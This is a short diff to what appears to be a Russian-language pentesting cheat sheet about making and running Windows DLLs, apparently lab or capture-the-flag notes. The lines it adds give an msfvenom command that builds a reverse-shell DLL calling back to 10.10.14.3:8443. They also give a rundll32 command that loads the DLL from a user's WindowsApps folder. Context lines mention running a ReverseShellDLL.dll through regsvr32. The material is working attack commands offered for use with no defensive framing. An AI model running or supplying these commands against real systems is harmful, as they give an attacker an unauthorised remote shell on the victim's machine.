@@ -4,6 +4,11 @@ regsvr32.exe ReverseShellDLL.dll (запуск dll)
  
 -static     компиляция со всеми билиотеками во внутрь
 
+# Запуск DLL из msvenom
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+    rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+
 # Cоздание dll на с++
 
 sudo apt install mingw-w64
